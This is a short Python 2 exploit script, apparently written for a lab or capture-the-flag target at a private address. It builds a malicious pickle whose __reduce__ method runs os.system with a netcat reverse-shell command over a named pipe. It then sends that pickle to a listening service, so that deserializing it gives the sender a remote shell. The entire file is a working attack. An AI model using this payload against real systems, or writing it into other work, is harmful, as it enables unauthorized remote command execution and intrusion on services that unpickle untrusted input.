#!/usr/bin/env python
#payload.py
import pickle
import socket
import os

class payload(object):
    def __reduce__(self):
        comm = "rm /tmp/shell; mknod /tmp/shell p; nc 10.10.51.191 10008 0</tmp/shell | /bin/sh 1>/tmp/shell"
        return (os.system, (comm,))

payload = pickle.dumps(payload())
soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soc.connect(("10.10.51.191", 10007))
print soc.recv(1024)
soc.send(payload)
#print soc.recv(1024)
